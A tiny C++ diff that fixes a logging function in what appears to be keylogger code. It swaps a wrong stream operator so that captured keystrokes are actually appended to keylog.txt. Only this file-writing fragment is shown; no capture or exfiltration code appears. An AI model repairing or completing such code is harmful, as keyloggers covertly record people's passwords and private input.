@@ -16,7 +16,7 @@ void LOG(string keystroke)
   logFile.open("keylog.txt", fstream::app);
   if(logFile.is_open())
   {
-    logFile >> keystroke;
+    logFile << keystroke;
     logFile.close();
   }
 }
